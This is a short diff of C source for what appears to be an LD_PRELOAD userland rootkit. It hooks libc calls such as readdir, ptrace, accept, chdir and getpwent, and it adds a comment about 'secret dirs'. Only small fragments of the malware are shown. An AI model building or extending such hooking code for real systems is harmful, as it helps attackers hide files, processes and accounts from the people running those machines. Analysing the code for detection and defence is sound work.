@@ -27,7 +27,6 @@ char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
 off_t (*old_lseek)(int fildes, off_t offset, int whence);
 int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
-char *(*old_getenv)(const char *name);
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
@@ -733,7 +732,8 @@ struct dirent64 *readdir64(DIR *dirp)
 
 
 int chdir(const char *path)
-{ 
+{
+       	/* cd still works on secret dirs because it is implemented in terms of cdir(2), not cdir(1) */	
 	HOOK(chdir);
 	HOOK(__xstat);
 	#ifdef DEBUG
@@ -1251,3 +1251,5 @@ struct passwd *getpwent(void)
 	} 
 	return pw; 
 }
+
+
